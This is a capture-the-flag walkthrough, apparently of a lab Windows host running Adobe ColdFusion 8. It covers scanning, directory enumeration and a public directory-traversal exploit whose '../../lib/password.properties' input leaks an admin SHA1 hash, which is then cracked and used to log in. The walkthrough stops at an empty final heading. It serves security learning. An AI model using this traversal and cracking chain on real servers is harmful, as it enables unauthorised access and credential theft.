# References
1. [X Writeup (x)](x)

# Summary
### 1. NMAP

# Attack
## 1. NMAP
Start.
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.11 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-17 16:39 +08
...
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Windows OS, with three ports. Okay. Let's see the vulnerability script.
```
hippoeug@kali:~$ nmap --script vuln 10.10.10.11 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-17 16:44 +08
...
PORT      STATE SERVICE
135/tcp   open  msrpc
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8500/tcp  open  fmtp
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
```
Nevermind, let's move on.

## 2. Enumeration & Attack Attempt 1: MSRPC
Let's start finding some possible vulnerabilities.
```
hippoeug@kali:~$ searchsploit msrpc
Exploits: No Results
Shellcodes: No Results
```
Nothing. Hmm, let's Google for some potential exploits we can use, and we see [one](https://www.rapid7.com/db/modules/exploit/multi/misc/msf_rpc_console/).
```
msf5 > use exploit/multi/misc/msf_rpc_console
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf5 exploit(multi/misc/msf_rpc_console) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/misc/msf_rpc_console) > show targets
...
msf5 exploit(multi/misc/msf_rpc_console) > set target 1
target => 1
msf5 exploit(multi/misc/msf_rpc_console) > show options

Module options (exploit/multi/misc/msf_rpc_console):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Password for the specified username
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     55552            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME  msf              yes       Username for Metasploit RPC
...
```
Oh dang it, we need a Username and Password for the RPC. Time to try something else.

## 3. Enumeration & Attack Attempt 2: FMTP
Let's searchspoit FMTP and see what we get.
```
hippoeug@kali:~$ searchsploit fmtp
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Asterisk chan_pjsip 15.2.0 - 'SDP fmtp' Denial of Service                                                                           | linux/dos/44183.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Crap. DoS is not what we need. We were also unable to find any potential attacks on Google.

Honestly at this point, I was stuck and had to look for some clues online. Turns out, I simply "forgotten" one of the fundamentals, which is to try accessing these ports on a web browser. Port 80 (HTTP) & port 443 (HTTPS) aren't the only ports available on a web browser!

Navigating to `http://10.10.10.11:8500`, which takes forever to load, we see what seems to be a listing of a file system.
```
Index of /

CFIDE/               dir   03/22/17 08:52 μμ
cfdocs/              dir   03/22/17 08:55 μμ
```
Very cool, let's see `CFIDE/` first.
```
Index of /CFIDE/

Parent ..                                              dir   03/22/17 08:52 μμ
Application.cfm                                       1151   03/18/08 11:06 πμ
adminapi/                                              dir   03/22/17 08:53 μμ
administrator/                                         dir   03/22/17 08:55 μμ
classes/                                               dir   03/22/17 08:52 μμ
componentutils/                                        dir   03/22/17 08:52 μμ
debug/                                                 dir   03/22/17 08:52 μμ
images/                                                dir   03/22/17 08:52 μμ
install.cfm                                          12077   03/18/08 11:06 πμ
multiservermonitor-access-policy.xml                   278   03/18/08 11:07 πμ
probe.cfm                                            30778   03/18/08 11:06 πμ
scripts/                                               dir   03/22/17 08:52 μμ
wizards/                                               dir   03/22/17 08:52 μμ
```
Hmm, doing some Googling, we see `.cfm` is a Cold Fusion Markup file, which are web pages made up of specific code that enables scripts and applications to run on a ColdFusion web server. Let's KIV this.

Going top down, we enumerate `adminapi/` next.
```
Index of /CFIDE/adminapi/

Parent ..                                       dir   03/22/17 08:53 μμ
Application.cfm                                2602   03/18/08 11:06 πμ
_datasource/                                    dir   03/22/17 08:52 μμ
accessmanager.cfc                             20553   03/18/08 11:06 πμ
administrator.cfc                            164570   03/18/08 11:06 πμ
base.cfc                                      56505   03/18/08 11:06 πμ
customtags/                                     dir   03/22/17 08:52 μμ
datasource.cfc                               382660   03/18/08 11:06 πμ
debugging.cfc                                101130   03/18/08 11:06 πμ
eventgateway.cfc                              95781   03/18/08 11:06 πμ
extensions.cfc                               130902   03/18/08 11:06 πμ
flex.cfc                                      13731   03/18/08 11:06 πμ
mail.cfc                                      48694   03/18/08 11:06 πμ
runtime.cfc                                  212558   03/18/08 11:06 πμ
security.cfc                                 299192   03/18/08 11:06 πμ
servermonitoring.cfc                         451021   03/18/08 11:06 πμ
```
Ah, looks like more config files of sorts. Let's move to the next one, `administrator/`.

Enumerating to `http://10.10.10.11:8500/CFIDE/administrator/`, we see a that it is not a directory, but instead a Adobe ColdFusion 8 Administrator login page, with a Username `admin` that cannot be changed.

We got a few ways to continue this, either looking for a password to login, search for vulnerabities with searchsploit etc, dirbuster this, or something.

## 4. Further Enumeration of Port 8500, FMTP
Inspecting the source page of the `CFIDE/administrator/` login page, we see something interesting.
```
<form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));" >
```
From this, we know that the salted password is encrypted with SHA1.

Let's enumerate a little more down the list of directories.
```
Index of /CFIDE/classes/

Parent ..                                 dir   03/22/17 08:52 μμ
cf-j2re-win.cab                       5073487   03/18/08 11:06 πμ
cfapplets.jar                           87810   03/18/08 11:06 πμ
images/                                   dir   03/22/17 08:52 μμ
```
```
Index of /CFIDE/componentutils/

Parent ..                                                 dir   03/22/17 08:52 μμ
Application.cfm                                          2477   03/18/08 11:07 πμ
_component_cfcToHTML.cfm                                 8560   03/18/08 11:07 πμ
_component_cfcToMCDL.cfm                                 2643   03/18/08 11:07 πμ
_component_style.cfm                                      462   03/18/08 11:07 πμ
_component_utils.cfm                                     7247   03/18/08 11:07 πμ
cfcexplorer.cfc                                         11121   03/18/08 11:07 πμ
cfcexplorer_utils.cfm                                    6557   03/18/08 11:07 πμ
componentdetail.cfm                                      1215   03/18/08 11:07 πμ
componentdoc.cfm                                          629   03/18/08 11:07 πμ
componentlist.cfm                                        1212   03/18/08 11:07 πμ
gatewaymenu/                                              dir   03/22/17 08:52 μμ
login.cfm                                               19984   03/18/08 11:06 πμ
packagelist.cfm                                          1286   03/18/08 11:07 πμ
utils.cfc                                                1180   03/18/08 11:07 πμ
```
```
Index of /CFIDE/debug/

Parent ..                              dir   03/22/17 08:52 μμ
blank.html                              78   03/18/08 11:06 πμ
cf_debugFr.cfm                        2843   03/18/08 11:06 πμ
images/                                dir   03/22/17 08:52 μμ
includes/                              dir   03/22/17 08:52 μμ
```
```
Index of /CFIDE/debug/includes/

Parent ..                                         dir   03/22/17 08:52 μμ
cf_debug_main.js                                 1195   03/18/08 11:06 πμ
```
```
Index of /CFIDE/images/

Parent ..                             dir   03/22/17 08:52 μμ
required.gif                           94   03/18/08 11:07 πμ
skins/                                dir   03/22/17 08:52 μμ
```
```
Index of /CFIDE/scripts/

Parent ..                                        dir   03/22/17 08:52 μμ
CF_RunActiveContent.js                           116   03/18/08 11:07 πμ
ajax/                                            dir   03/22/17 08:52 μμ
cfform-src.js                                  22480   03/18/08 11:07 πμ
cfform.js                                      10617   03/18/08 11:07 πμ
cfform.swc                                    424916   03/18/08 11:07 πμ
cfformhistory.cfm                               4120   03/18/08 11:06 πμ
cfformhistory.js                                1616   03/18/08 11:07 πμ
cfformhistory.swf                               2656   03/18/08 11:07 πμ
css/                                             dir   03/22/17 08:52 μμ
dump.js                                         5142   03/18/08 11:07 πμ
fpwrapper.fla                                 165376   03/18/08 11:07 πμ
fpwrapper.swf                                  27476   03/18/08 11:07 πμ
masks-src.js                                    9393   03/18/08 11:07 πμ
masks.js                                        3897   03/18/08 11:07 πμ
wddx.js                                        22617   03/18/08 11:07 πμ
xsl/                                             dir   03/22/17 08:52 μμ
```
```
Index of /CFIDE/wizards/

Parent ..                         dir   03/22/17 08:52 μμ
common/                           dir   03/22/17 08:52 μμ
```
```
Index of /CFIDE/wizards/common/

Parent ..                                                    dir   03/22/17 08:52 μμ
_authenticatewizarduser.cfm                                 1585   03/18/08 11:07 πμ
_logintowizard.cfm                                          7135   03/18/08 11:07 πμ
utils.cfc                                                   1596   03/18/08 11:07 πμ
```
Ah, we cannot find a file that we can use to our advantage.

## 5. Finding & Attacking with Adobe ColdFusion 8 Exploits
As usual, we will do a Searchsploit on Adobe ColdFusion 8.
```
hippoeug@kali:~$ searchsploit coldfusion
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                 | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                              | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                 | multiple/remote/16985.rb
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                         | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                       | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                   | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                  | cfm/webapps/36172.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                           | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                              | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                     | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                           | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                        | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                     | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                              | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                               | cfm/webapps/33168.txt
Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                                                 | multiple/remote/19093.txt
Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                                                       | windows/local/19220.c
Allaire ColdFusion Server 4.0/4.0.1 - 'CFCACHE' Information Disclosure                                                              | multiple/remote/19712.txt
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                   | cfm/webapps/16788.rb
ColdFusion 9-10 - Credential Disclosure                                                                                             | multiple/webapps/25305.py
...
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Already, we see some interesting results, lots of options to try.

To aid our job, we also do a Google search in hopes of finding the most common vulnerability, one we could try first.
We see [exploit](https://www.exploit-db.com/exploits/14641) `Adobe ColdFusion - Directory Traversal 14641.py`. Apparently, this exploit "exploits a directory traversal bug in Adobe ColdFusion, by reading the password.properties a user can login using the encrypted password itself. This should work on version 8 and below.".

Additionally, another [exploit with Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) titled `ColdFusion 8.0.1 Arbitrary File Upload and Execute`. We might need to try this later on if a payload if required to be uploaded.

Let's try the `Directory Traversal` exploit, `14641.py`.
```
hippoeug@kali:~$ searchsploit -m 14641.py
  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable, with CRLF line terminators

hippoeug@kali:~$ python 14641.py
usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed

hippoeug@kali:~$ python 14641.py 10.10.10.11 8500 ../../../../../../../lib/password.properties
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/archives/index.cfm
title from server in /CFIDE/administrator/archives/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /cfide/install.cfm
title from server in /cfide/install.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/entman/index.cfm
title from server in /CFIDE/administrator/entman/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/enter.cfm
title from server in /CFIDE/administrator/enter.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
```
Ooh! Very interesting, we see a password `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03`, which looks like a Hash. Since we know from earlier password is a SHA1 hash, we can use Crackstation to get the password.
```
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03	sha1	happyday
```
With this password `happyday`, let's go back to `http://10.10.10.11:8500/CFIDE/administrator/` and try to login.

We get directed to `10.10.10.11:8500/CFIDE/administrator/index.cfm` and successfully got in!

## 6. Getting Flags?
